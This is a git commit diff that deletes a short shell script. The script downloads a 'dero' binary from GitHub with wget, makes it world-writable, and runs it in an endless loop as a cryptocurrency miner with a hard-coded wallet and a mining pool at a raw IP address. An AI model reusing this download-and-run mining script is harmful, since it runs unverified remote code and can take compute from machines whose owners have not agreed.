929e9ab3e10a2fe5edefe6474ce571a1dddfd48a
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-11-21 12:12:13 +0700

    Update and rename dwty.sh to nesk.sh

--- dwty.sh
+++
@@ -1,7 +0,0 @@
-wget https://github.com/aqshakuy/dora/raw/main/dero
-chmod 777 dero
-echo "Replace YOUR_ADDRESS to run the miner"
-while :; do
-./dero -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6vu8ddjpfgyatqqwj5kd.$(echo $(shuf -i 1-20000 -n 1)-m1) -r 45.76.162.175:80 -p stratum;
-    sleep 5;
-done
